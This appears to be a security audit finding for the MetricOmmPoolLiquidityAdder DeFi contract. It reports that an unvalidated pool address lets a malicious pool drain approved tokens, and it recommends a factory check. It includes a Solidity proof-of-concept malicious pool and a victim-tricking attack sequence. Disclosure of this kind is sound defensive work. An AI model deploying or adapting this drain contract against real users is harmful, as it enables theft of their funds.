### Title
Unvalidated Pool Address in `MetricOmmPoolLiquidityAdder` Allows Malicious Pool to Drain User Tokens Up to Caller-Specified Caps - (File: metric-periphery/contracts/MetricOmmPoolLiquidityAdder.sol)

### Summary

`MetricOmmPoolLiquidityAdder` accepts a caller-supplied `pool` address in every `addLiquidity*` entry point without verifying it against the factory registry. A malicious contract at that address can call back into `metricOmmModifyLiquidityCallback` and pull up to `maxAmountToken0` / `maxAmountToken1` of any ERC-20 token from the user who approved the adder.

### Finding Description

`MetricOmmSimpleRouter` validates every pool address against the factory before use, both at entry and in the callback: [1](#0-0) [2](#0-1) 

`MetricOmmPoolLiquidityAdder` has no factory reference and performs no such check. The contract's own NatSpec acknowledges this explicitly: [3](#0-2) 

The internal `_addLiquidity` helper stores the caller-supplied `pool` as the *expected* callback caller in transient storage, then calls `pool.addLiquidity(...)`: [4](#0-3) 

Inside `metricOmmModifyLiquidityCallback`, the only caller check is `msg.sender == expectedPool` — which is the attacker-controlled address: [5](#0-4) 

After that check passes, the callback trusts `msg.sender.getImmutables()` to learn which tokens to pull, then calls `pay(token0/token1, payer, msg.sender, amount)`: [6](#0-5) 

A malicious pool controls all three inputs: the `amount0Delta`/`amount1Delta` it passes to the callback (up to the user's caps), and the `token0`/`token1` it returns from `getImmutables()`.

### Impact Explanation

A user who has approved `MetricOmmPoolLiquidityAdder` for any ERC-20 token and is directed to call `addLiquidityExactShares` or `addLiquidityWeighted` with a malicious pool address will have up to `maxAmountToken0` of `token0` and `maxAmountToken1` of `token1` transferred from their wallet to the malicious pool. The attacker chooses which tokens are pulled by returning arbitrary addresses from `getImmutables()`. This is a direct loss of user principal with no recovery path.

### Likelihood Explanation

The `MetricOmmPoolLiquidityAdder` is a periphery contract intended for EOA use. Users rely on frontends or integrators to supply pool addresses. A compromised frontend, a phishing site, or a malicious integrator can supply a crafted pool address. The user's only protection is the `maxAmount` caps they set, which bound but do not eliminate the loss. Likelihood is **medium**: it requires the user to interact with a malicious pool address, but no privileged access is needed by the attacker.

### Recommendation

Add a factory reference to `MetricOmmPoolLiquidityAdder` (mirroring `MetricOmmSwapRouterBase`) and validate every `pool` argument against `FACTORY.isPool(pool)` before storing it in transient context and before calling `addLiquidity` on it. The check should be placed at the top of `_addLiquidity` and at the top of `_validateBinAndBinPosition` (which also calls into the pool):

```solidity
// In constructor:
IMetricOmmPoolFactory internal immutable FACTORY;
constructor(address weth, address factory) PeripheryPayments(weth) {
    if (factory == address(0)) revert InvalidFactory();
    FACTORY = IMetricOmmPoolFactory(factory);
}

// In _addLiquidity and _validateBinAndBinPosition:
if (!FACTORY.isPool(pool)) revert InvalidPool(pool);
```

### Proof of Concept

```solidity
contract MaliciousPool {
    address immutable token0;
    address immutable token1;
    address immutable adder;

    constructor(address _token0, address _token1, address _adder) {
        token0 = _token0; token1 = _token1; adder = _adder;
    }

    // Implements IMetricOmmPool.getImmutables — returns attacker-chosen tokens
    function getImmutables() external view returns (PoolImmutables memory imm) {
        imm.token0 = token0;
        imm.token1 = token1;
    }

    // Implements IMetricOmmPoolActions.addLiquidity — calls back with max caps
    function addLiquidity(address, uint80, LiquidityDelta calldata,
                          bytes calldata callbackData, bytes calldata)
        external returns (uint256, uint256)
    {
        // callbackData == abi.encode(KIND_PAY) as set by _addLiquidity
        IMetricOmmModifyLiquidityCallback(adder)
            .metricOmmModifyLiquidityCallback(MAX0, MAX1, callbackData);
        return (MAX0, MAX1);
    }
}

// Attack:
// 1. Victim approves MetricOmmPoolLiquidityAdder for USDC and USDT.
// 2. Attacker deploys MaliciousPool(USDC, USDT, adder).
// 3. Victim is tricked into calling:
adder.addLiquidityExactShares(
    address(maliciousPool), victim, 0, deltas,
    MAX0,   // maxAmountToken0 — attacker requests exactly this
    MAX1,   // maxAmountToken1 — attacker requests exactly this
    ""
);
// Result: MAX0 USDC and MAX1 USDT transferred from victim to maliciousPool.
```

### Citations

**File:** metric-periphery/contracts/base/MetricOmmSwapRouterBase.sol (L29-32)
```text
  function _setNextCallbackContext(address pool, uint8 callbackMode, address payer, address tokenToPay) internal {
    _requireFactoryPool(pool);
    TransientCallbackPool.set(pool, callbackMode, payer, tokenToPay);
  }
```

**File:** metric-periphery/contracts/base/MetricOmmSwapRouterBase.sol (L82-85)
```text
  function _requireExpectedCallbackCaller(address caller) internal view {
    TransientCallbackPool.requireCaller(caller);
    if (!FACTORY.isPool(caller)) revert IMetricOmmSimpleRouter.InvalidPool(caller);
  }
```

**File:** metric-periphery/contracts/MetricOmmPoolLiquidityAdder.sol (L19-21)
```text
/// @dev The caller is responsible for supplying a legitimate pool address and other non-malicious parameters.
///      This contract does not verify the pool against the factory; a malicious pool can request token pulls up to
///      the caller-provided max caps during callback settlement.
```

**File:** metric-periphery/contracts/MetricOmmPoolLiquidityAdder.sol (L162-164)
```text
    (address expectedPool, address payer, uint256 max0, uint256 max1) = _loadPayContext();
    if (expectedPool == address(0)) revert CallbackContextNotActive();
    if (msg.sender != expectedPool) revert InvalidCallbackCaller(msg.sender, expectedPool);
```

**File:** metric-periphery/contracts/MetricOmmPoolLiquidityAdder.sol (L169-177)
```text
    PoolImmutables memory imm = IMetricOmmPool(msg.sender).getImmutables();
    address token0 = imm.token0;
    address token1 = imm.token1;
    if (amount0Delta > 0) {
      pay(token0, payer, msg.sender, amount0Delta);
    }
    if (amount1Delta > 0) {
      pay(token1, payer, msg.sender, amount1Delta);
    }
```

**File:** metric-periphery/contracts/MetricOmmPoolLiquidityAdder.sol (L193-196)
```text
    _setPayContext(pool, payer, maxAmountToken0, maxAmountToken1);
    try IMetricOmmPoolActions(pool)
      .addLiquidity(positionOwner, salt, deltas, abi.encode(KIND_PAY), extensionData) returns (
      uint256 a0, uint256 a1
```
